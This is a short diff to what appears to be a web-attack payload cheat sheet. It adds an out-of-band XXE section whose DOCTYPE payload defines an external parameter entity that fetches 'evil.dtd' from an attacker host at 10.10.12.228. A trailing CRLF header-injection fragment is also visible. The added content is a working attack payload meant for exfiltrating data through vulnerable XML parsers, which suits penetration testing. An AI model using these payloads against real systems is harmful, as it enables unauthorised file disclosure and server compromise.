@@ -614,4 +614,15 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 /%0D%%0ALocation
 
 ## XXE OOB
-<
+
+-> Part 1
+
+<!DOCTYPE okay[
+<!ENTITY % ult SYSTEM "http://10.10.12.228/evil.dtd">
+%ult;
+]
+>
+
+-> Part 2
+
+vulns/xxe_oob/evil.dtd
